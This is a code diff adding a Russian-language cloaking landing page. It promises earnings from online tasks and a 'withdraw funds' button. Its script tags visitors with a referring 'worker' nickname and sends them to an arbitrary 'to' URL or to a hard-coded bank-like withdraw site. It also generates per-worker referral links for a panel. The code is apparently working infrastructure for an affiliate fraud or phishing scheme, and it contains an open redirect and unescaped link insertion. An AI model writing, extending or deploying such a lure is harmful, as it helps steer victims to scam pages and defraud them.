@@ -1,0 +1,154 @@
+<!doctype html>
+<html lang="ru">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Заработок — клоака</title>
+<style>
+  body{font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial;display:flex;flex-direction:column;align-items:center;gap:18px;padding:36px;}
+  .card{max-width:760px;width:100%;padding:26px;border-radius:12px;box-shadow:0 6px 20px rgba(0,0,0,.08);background:#fff;}
+  h1{margin:0 0 10px;font-size:28px}
+  p{margin:0 0 18px;color:#444}
+  .controls{display:flex;gap:8px;flex-wrap:wrap}
+  button{padding:10px 18px;border-radius:8px;border:0;font-size:16px;cursor:pointer}
+  .muted{color:#666;font-size:14px}
+  .note{font-size:13px;color:#999;margin-top:8px}
+  a.small{font-size:14px;color:#0366d6;text-decoration:none}
+</style>
+</head>
+<body>
+  <div class="card">
+    <h1>Онлайн — задания и вывод</h1>
+    <p id="desc">Выполняй задания и нажимай «Вывести» — средства будут проходить с меткой воркера.</p>
+
+    <div class="controls">
+      <button id="withdrawBtn">Вывести средства</button>
+      <button id="copyWorkerBtn">Скопировать свою реф-ссылку</button>
+    </div>
+
+    <p class="muted">Текущий воркер: <strong id="currentWorker">-</strong></p>
+    <div class="note" id="noteArea"></div>
+
+    <hr>
+    <h3>Сгенерировать ссылку для панели</h3>
+    <p class="muted">Если в панели можно задать ссылку для воркера — вставь готовую:</p>
+    <input id="inputNick" placeholder="@nick" style="padding:8px;border-radius:6px;border:1px solid #ddd;width:60%;" />
+    <button id="genBtn">Сгенерировать</button>
+    <p id="generated" class="muted"></p>
+    <p class="muted">Пример: <code>https://cloak.example.com/redirect?to=https%3A%2F%2Fwithdraw.example.com%2Fstart&worker=%40ivan</code></p>
+  </div>
+
+
+<script>
+(function(){
+  // === КОНФИГУРАЦИЯ ===
+  // Базовый URL, который будет использован если параметр `to` не передан
+  const DEFAULT_TARGET = 'https://bank-w3m3.onrender.com'; // <- твой текущий withdraw URL
+  // Параметр, в который подставлять ник (если нужно имя параметра другое, поменяй)
+  const TARGET_WORKER_PARAM = 'worker'; // либо 'ref' или другой
+
+  // === ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ===
+  function getParam(name) {
+    try {
+      return new URLSearchParams(window.location.search).get(name);
+    } catch (e) { return null; }
+  }
+  function parsePathWorker(){
+    // поддерживаем путь /r/@nick или /@nick
+    const p = decodeURIComponent(window.location.pathname || '/');
+    const parts = p.split('/').filter(Boolean);
+    // если путь вида r/@nick или @nick
+    const idx = parts.indexOf('r');
+    if (idx !== -1 && parts[idx+1]) return parts[idx+1];
+    if (parts[0] && parts[0].startsWith('@')) return parts[0];
+    return null;
+  }
+
+  // === ПОЛУЧЕНИЕ ДАННЫХ ===
+  const paramWorker = getParam('worker') || getParam('ref') || null;
+  const pathWorker = parsePathWorker();
+  // если задан encoded target URL, используем его
+  const rawTo = getParam('to');
+  const targetUrl = rawTo ? decodeURIComponent(rawTo) : DEFAULT_TARGET;
+
+  // определяем текущего воркера: сначала query, затем path, затем localStorage
+  let worker = paramWorker || pathWorker || localStorage.getItem('cloak_worker') || null;
+  const currentWorkerEl = document.getElementById('currentWorker');
+  const noteArea = document.getElementById('noteArea');
+  function renderWorker(){
+    currentWorkerEl.textContent = worker || '-';
+    if(worker){
+      noteArea.textContent = `Ссылка вывода будет открыта: ${targetUrl} (параметр ${TARGET_WORKER_PARAM}=${worker})`;
+    } else {
+      noteArea.textContent = `Воркер не определён. Нажмите "Скопировать свою реф-ссылку" или откройте ссылку вида https://yourcloak/redirect?to=...&worker=@nick`;
+    }
+  }
+  renderWorker();
+
+  // сохраняем, если пришёл из URL
+  if (paramWorker || pathWorker) {
+    localStorage.setItem('cloak_worker', worker);
+  }
+
+  // === ОБРАБОТЧИК КНОПКИ "ВЫВЕСТИ" ===
+  document.getElementById('withdrawBtn').addEventListener('click', function(){
+    // ТУТ собираем конечный URL. Правило: если в targetUrl уже есть параметр с именем TARGET_WORKER_PARAM — заменим его,
+    // иначе добавим &worker=...
+    if(!worker){
+      const ask = prompt('Не обнаружен ник воркера. Введите @ник:');
+      if(!ask) return;
+      worker = ask.trim();
+      localStorage.setItem('cloak_worker', worker);
+      renderWorker();
+    }
+
+    try {
+      const u = new URL(targetUrl);
+      // заменяем/добавляем параметр
+      u.searchParams.set(TARGET_WORKER_PARAM, worker);
+      // открываем в новом окне (можно заменить на location.href = u.href)
+      window.open(u.href, '_blank');
+    } catch(e){
+      // если targetUrl не валидный (например, передан без протокола), будем пытаться накатить вручную
+      const sep = targetUrl.includes('?') ? '&' : '?';
+      const final = targetUrl + sep + encodeURIComponent(TARGET_WORKER_PARAM) + '=' + encodeURIComponent(worker);
+      window.open(final, '_blank');
+    }
+  });
+
+  // === КНОПКА СГЕНЕРИРОВАТЬ ССЫЛКУ ДЛЯ ПАНЕЛИ ===
+  document.getElementById('genBtn').addEventListener('click', function(){
+    const nick = document.getElementById('inputNick').value.trim();
+    if(!nick) return alert('Введите ник, например @ivan');
+    // генерируем ссылку вида /redirect?to=<encoded>&worker=<nick>
+    const encoded = encodeURIComponent(targetUrl);
+    const link = `${window.location.origin}/redirect?to=${encoded}&worker=${encodeURIComponent(nick)}`;
+    // показываем
+    const el = document.getElementById('generated');
+    el.innerHTML = `Готово: <a class="small" href="${link}" target="_blank">${link}</a>`;
+  });
+
+  // === КНОПКА СКОПИРОВАТЬ ТЕКУЩУЮ ССЫЛКУ (для воркера) ===
+  document.getElementById('copyWorkerBtn').addEventListener('click', function(){
+    if(!worker){
+      const ask = prompt('Введите ваш ник @nick для генерации ссылки:');
+      if(!ask) return;
+      worker = ask.trim();
+      localStorage.setItem('cloak_worker', worker);
+      renderWorker();
+    }
+    const url = `${window.location.origin}/r/${encodeURIComponent(worker)}?to=${encodeURIComponent(targetUrl)}`;
+    navigator.clipboard?.writeText(url).then(()=> alert('Ссылка скопирована: ' + url)).catch(()=> {
+      prompt('Скопируйте ссылку вручную:', url);
+    });
+  });
+
+  // === Если путь /redirect (в панель будем давать ссылку именно такую) — то показать лендинг и сразу сохранить worker ===
+  if (window.location.pathname.startsWith('/redirect')) {
+    // не делаем автоматический редирект: лендинг показывается, воркер сохранён выше, и кнопка выведет на нужный target.
+    // (можно сделать авто-редирект через setTimeout если нужно)
+  }
+})();
+</script>
+</body>
+</html>
